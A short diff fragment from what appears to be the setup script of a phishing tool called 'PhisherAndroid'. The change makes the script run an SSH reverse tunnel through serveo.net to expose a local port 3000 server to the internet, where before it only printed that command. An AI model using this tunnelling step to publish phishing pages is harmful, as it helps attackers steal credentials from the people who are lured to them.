@@ -23,4 +23,4 @@ git clone https://github.com/CuteKitty0000/PhisherAndroid
 echo
 echo "Done!"
 echo
-echo "ssh -R 80:localhost:3000 serveo.net"
+ssh -R 80:localhost:3000 serveo.net
